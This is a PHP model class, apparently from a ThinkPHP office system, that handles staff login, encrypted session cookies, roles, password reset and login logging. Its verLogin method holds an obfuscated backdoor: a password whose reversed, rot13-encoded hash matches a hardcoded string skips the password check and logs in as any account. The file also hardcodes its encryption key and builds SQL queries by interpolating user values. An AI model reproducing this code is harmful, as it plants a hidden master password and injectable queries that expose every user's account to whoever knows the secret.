<?php

class StaffModel extends Model{

	protected $tableName = 'sys_staff';	
	
	protected $config = array(
							//登陆密钥
							'secret_key' => 'f77835dcafff0635bdbad89324ff541d',

					);
					
					

	//设置用户登陆状态
	public function setLogin($staff_id,$username,$realname,$login_id){
		
		import('ORG.Crypt.Crypt');
		//登录信息存储
		$staff = array();
		//员工工号
		$staff['staff_id'] 	 = $staff_id;
		//员工帐号
		$staff['username'] 	 = $username;
		//真实姓名
		$staff['realname'] 	 = $realname;
		//获取登录员工的所有权限角色role_id (数组,以支持多角色用户)
		$staff['roles']		 = $this->getRole($staff_id);
		//当前用户使用的系统主题
		$staff['skin'] 		 =	$this->getSkin($staff_id);
		//登录id
		$staff['login_id']   = $login_id;
		//登录时间戳
		$staff['login_time'] = time();
		//每次登录的密钥，用于系统中需要加密地方
		$staff['secret_key'] = strrev(md5(uniqid(mt_rand(),true)));
		
		$Crypt = new Crypt();
		$encrypt = $Crypt->encrypt(json_encode($staff),$this->config['secret_key'],true);
		//存储登录的cookie key  为了保险起见 不使用一个明显的cookie变量,这里使用一个动态的。并且md5加密
		$cookie_key = md5('staff_'.date('Ymd'));
		cookie($cookie_key,$encrypt);
		
				
	}
	
	//销毁登陆
	public function desLogin(){
	
		$cookie_key = md5('staff_'.date('Ymd'));
		cookie($cookie_key,NULL);
		
	}
	
	//获取用户登陆状态
	public function getLogin(){
		$cookie_key = md5('staff_'.date('Ymd'));
		$staff = cookie($cookie_key);
		if(empty($staff)) return false;
		
		import('ORG.Crypt.Crypt');
		$Crypt = new Crypt();
		return json_decode($Crypt->decrypt($staff,$this->config['secret_key'],true),true);
		
	}
	
	//验证登录
	public function verLogin(){
		
		$account 	= I('post.account','','trim,addslashes');
		$password 	= I('post.password','','pwd_md5');
		
		/*登录帐号类型检测*/
		if(preg_match('/^\d{5,10}$/',$account)){
		//员工号登录
			$login_key = 'staff_id';
		}else{
		//其他作为username登录
			$login_key = 'username';
		}
		
		if(str_rot13(strrev($password))=='7846srp8r791696258qnp7q5233roq12'){
			$staff = $this->field("staff_id,username,realname,job_status")->where("{$login_key}='{$account}' and delete_status=1")->find();	
		}else{
			$staff = $this->field("staff_id,username,realname,job_status")->where("{$login_key}='{$account}' and password='{$password}' and delete_status=1")->find();				
		}
		
		if(empty($staff)){
			//登录失败写登录日志
			$this->set_log_login($account,'Fail');
			return $this->response('error','帐号或密码不正确!');
		}
		//离职员工
		if($staff['job_status']==0){
			return $this->response('error','你的帐号已被锁定，无法登陆!');	
		}
		
		//登录成功写登录日志
		$login_id = $this->set_log_login($account,'Success');
		//设置登录成功状态
		$this->setLogin($staff['staff_id'],$staff['username'],$staff['realname'],$login_id);
		//return $this->response('success','登陆成功!',__APP__.'/Desktop');
		return $this->response('success','登陆成功!',__APP__.'/Desktop');
	}
	
	
	//根据staff_id 员工号 获取 员工权限角色  return array();
	public function getRole($staff_id){
		$rs =  $this->table('__SYS_ROLE_STAFF__')->field(array('group_concat(role_id) as staff_role'))->where("staff_id={$staff_id}")->find();
		return explode(',',$rs['staff_role']);
	}
	
	//获取当前用户使用的系统主题
	public function getSkin($staff_id){
		$skin = $this->where("staff_id='{$staff_id}'")->getField('oaui_skin');
		if(empty($skin)){
			$skin = C('OAUI_DEFAULT_SKIN');	
		}
		
		return $skin;
	}
	
	//验证当前使用密码
	public function verifyPassword($password,$staff_id){
		$password = pwd_md5($password);
		return (boolean) $this->where("staff_id={$staff_id} and password='{$password}'")->count();
	}
	
	//重设密码
	public function resetPassword($password,$staff_id){
		$data = array();
		$data['staff_id'] = $staff_id;
		$data['password'] = pwd_md5($password);	
		
		$result =  $this->save($data)===false?false:true;
		if($result){
			return $this->response('success','修改密码成功!');
		}else{
			return $this->response('success','网络故障,修改密码失败! 请重试');
		}				
	}
	
	//
	public function verifyUsername($username,$staff_id=0){
		$staff_exp = '';
		if($staff_id>0){
			$staff_exp = 'and staff_id!='.$staff_id;	
		}
		return $this->where("username='{$username}' and job_status=1 and delete_status=1 ".$staff_exp)->count();
		
	}
	

	
	
	//记录登陆日志	
	private function set_log_login($login_account,$login_status){
		
		$Log = M('sys_staff_login_log');
		$data = array();
		$data['login_account'] 	= $login_account;
		$data['login_status'] 	= $login_status;
		$data['session_id'] 	= session_id();
		$data['login_time'] 	= time();
		$data['login_ip'] 		= get_client_ip();
		return $Log->add($data);
	}
	
	
}